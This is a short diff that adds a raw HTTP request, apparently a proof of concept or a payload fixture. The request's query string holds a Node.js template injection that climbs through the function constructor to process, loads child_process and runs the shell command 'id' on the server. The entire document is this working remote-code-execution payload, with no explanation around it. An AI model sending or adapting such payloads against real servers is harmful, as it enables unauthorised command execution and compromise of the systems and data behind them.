@@ -1,0 +1,4 @@
+GET /a?path={{\u0027\u0027.constructor.constructor(\u0027return%20process\u0027)().mainModule.require(\u0027child_process\u0027).execSync(\u0027id\u0027)}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
